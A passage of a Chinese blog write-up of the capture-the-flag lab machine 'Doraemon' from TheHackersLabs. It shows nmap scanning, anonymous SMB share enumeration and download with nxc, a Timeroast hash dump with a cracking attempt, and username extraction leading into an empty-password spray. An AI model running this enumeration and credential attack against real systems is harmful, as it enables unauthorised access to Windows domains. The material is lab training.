<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">TheHackersLabs - Doraemon | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧..." data-next-head=""/><meta property="og:title" content="TheHackersLabs - Doraemon | Sunset Blog" data-next-head=""/><meta property="og:description" content="Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-08-03" data-next-head=""/><meta property="article:modified_time" content="2025-08-03" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="TheHackersLabs" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="DNSADmins" data-next-head=""/><meta property="article:tag" content="SMB" data-next-head=""/><meta property="article:tag" content="CVE-2021-40469" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="TheHackersLabs - Doraemon" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon" data-next-head=""/><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><link rel="preload" href="/_next/static/css/f055e431c58b907b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-08-03","description":"Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan 枚举 SMB 匿名 有两个文件夹有读的权限，通过模块全部读出来 得到一个 txt 文件，内容： 致：埃斯特波纳铜锣烧1特别组 哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon"},"headline":"TheHackersLabs - Doraemon","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-08-03","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><link rel="stylesheet" href="/_next/static/css/f055e431c58b907b.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4c7ff0ae52612d94.js" defer=""></script><script src="/_next/static/EB9TO-uiYYo4SnKeXMjbl/_buildManifest.js" defer=""></script><script src="/_next/static/EB9TO-uiYYo4SnKeXMjbl/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">TheHackersLabs - Doraemon</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-08-03</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-08-03<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/TheHackersLabs/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">TheHackersLabs</span></a><a href="/tag/Windows/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Windows</span></a><a href="/tag/DNSADmins/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">DNSADmins</span></a><a href="/tag/SMB/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">SMB</span></a><a href="/tag/CVE-2021-40469/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">CVE-2021-40469</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsDoraemon","contentHtml":"\u003ch1\u003eDoraemon\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/30\"\u003ehttps://labs.thehackerslabs.com/machine/30\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nmap -sn 192.168.10.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:52 CST\nNmap scan report for 192.168.10.1\nHost is up (0.00057s latency).\nMAC Address: 0A:00:27:00:00:10 (Unknown)\nNmap scan report for 192.168.10.5\nHost is up (0.00081s latency).\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.7\nHost is up (0.00050s latency).\nMAC Address: 08:00:27:34:2C:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.10.100\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.26 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nmap -sT -min-rate 10000 -p- 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nWarning: 192.168.10.5 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.10.5\nHost is up (0.00038s latency).\nNot shown: 64597 closed tcp ports (conn-refused), 913 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49687/tcp open  unknown\n49705/tcp open  unknown\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.5\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 10:53 CST\nNmap scan report for 192.168.10.5\nHost is up (0.00049s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 08:53:47Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: DORAEMON)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: DORAEMON.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)\n|   Computer name: WIN-VRU3GG3DPLJ\n|   NetBIOS computer name: WIN-VRU3GG3DPLJ\\x00\n|   Domain name: DORAEMON.THL\n|   Forest name: DORAEMON.THL\n|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL\n|_  System time: 2025-08-03T10:53:48+02:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-03T08:53:48\n|_  start_date: 2025-08-03T08:25:53\n|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.86 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eSMB\u003c/code\u003e 匿名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\anonymous: (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有两个文件夹有读的权限，通过模块全部读出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003enxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsDoraemon/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到一个 \u003ccode\u003etxt\u003c/code\u003e 文件，内容：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  gorrocoptero cat kedadawapa.txt       \nAtención al grupo especial Dorayaki1 de Estepona\n\n- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?\n\n- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?\n\n- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!\n\n- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!\n\n- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!\n\n- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.\n\n- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦\n\n- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!\n\n- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.\n\n- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!\n\n- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!\n\n- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.\n\n- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!\n\n- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!\n\n- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!\n\n- Doraemon: Â¡A comer dorayakis!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e致：埃斯特波纳铜锣烧1特别组\u003c/p\u003e\n\u003cp\u003e哆啦A梦：嘿，伙计们！今天我们去吃铜锣烧怎么样？\u003c/p\u003e\n\u003cp\u003e大雄：好啊！我超爱吃铜锣烧！可是……我们去哪儿买呢？\u003c/p\u003e\n\u003cp\u003e静香：我听说街角开了一家新的铜锣烧店。据说是城里最好吃的！\u003c/p\u003e\n\u003cp\u003e小夫：拜托。总是有新东西。我迫不及待想尝尝。希望比上一家的更大！\u003c/p\u003e\n\u003cp\u003e巨人：我想要个大号的！而且要多馅儿！如果不是，我也可以去！\u003c/p\u003e\n\u003cp\u003e哆啦A梦：好吧，我们可以请大雄用时光机的力量，穿越到未来，给我们带一些3000年的铜锣烧。\u003c/p\u003e\n\u003cp\u003e大雄：等等！我不知道该不该用这台机器。上次我用的时候，结果把我带到了一个满是奇怪机器人的地方……\u003c/p\u003e\n\u003cp\u003e静香：别担心，大雄。我们只是去商店而已。我们不用去未来。我们可以步行！\u003c/p\u003e\n\u003cp\u003e小夫：听起来很无聊。不如我们来个比赛？第一个到店的人可以选择铜锣烧的口味。\u003c/p\u003e\n\u003cp\u003e巨人：我喜欢这个主意！不过你得跑得快才能赢我，小夫！\u003c/p\u003e\n\u003cp\u003e哆啦A梦：我们一起去怎么样？这样我们就能享受旅程了。而且，我可以用未来手机订一堆等着我们的铜锣烧！\u003c/p\u003e\n\u003cp\u003e大雄：这主意太棒了，哆啦A梦！这样我就不用跑了，还能确保每个人都有足够的铜锣烧。\u003c/p\u003e\n\u003cp\u003e静香：太好了！那我们去铜锣烧店吧！\u003c/p\u003e\n\u003cp\u003e小夫：好的！铜锣烧，来啦！\u003c/p\u003e\n\u003cp\u003e巨人：别忘了我！我要赢！\u003c/p\u003e\n\u003cp\u003e——哆啦A梦：我们吃铜锣烧吧！\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003eTimeroast ❌\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Timeroast python timeroast.py 192.168.10.5\n1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ehash\u003c/code\u003e 保存为 \u003ccode\u003ehash.txt\u003c/code\u003e , \u003ccode\u003ehashcat\u003c/code\u003e 爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没爆破出来\u003c/p\u003e\n\u003ch3\u003e域用户名枚举\u003c/h3\u003e\n\u003cp\u003e可能前面的是用户名，我们将其提取出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt\n\nDoraemon\nGigante\nNobita\nShizuka\nSuneo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们再对用户名进行测试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003e➜  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users\nSMB         